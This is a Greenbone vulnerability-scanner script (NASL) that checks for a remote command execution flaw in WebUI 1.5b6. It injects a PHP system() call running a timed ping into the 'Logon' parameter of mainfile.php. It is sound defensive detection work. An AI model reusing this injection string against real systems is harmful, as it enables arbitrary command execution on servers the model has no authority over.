# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805175");
  script_version("2024-06-28T15:38:46+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2015-04-27 17:26:29 +0530 (Mon, 27 Apr 2015)");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("WebUI RCE Vulnerability");

  script_tag(name:"summary", value:"WebUI is prone to a remote command execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able execute system command or not.");

  script_tag(name:"insight", value:"Flaw exists because the 'Logon' parameter
  is not properly sanitized upon submission to the mainfile.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to execute arbitrary command on the affected system.");

  script_tag(name:"affected", value:"WebUI version 1.5b6, Prior versions may
  also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/36821");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

http_port = http_get_port(default:80);

if(!http_can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/webui", http_cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"),  port:http_port);

  if(">WebUI" >< rcvRes)
  {
    if(os_host_runs("Windows") == "yes"){
      ping = "ping%20-n%20";
      wait_extra_sec = 5;
    } else {
      ping = "ping%20-c%20";
      wait_extra_sec = 7;
    }

    ## Added three times, to make sure its working properly
    sleep = make_list(3, 5, 7);

    ## Use sleep time to check we are able to execute command
    foreach sec (sleep)
    {
      url = dir + "/mainfile.php?username=RCE&password=RCE&_login=1"
                + "&Logon=';echo%20system('" + ping + sec + "%20127.0.0.1');'";

      sndReq = http_get(item:url,  port:http_port);

      ## Now check how much time it's taking to execute
      start = unixtime();
      rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:FALSE);
      stop = unixtime();

      time_taken = stop - start;

      ## Time taken is always 1 less than the sec
      ## So i am adding 1 to it
      time_taken = time_taken + 1;

      if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec)) exit(0);
    }
    security_message(port:http_port);
    exit(0);
  }
}

exit(99);
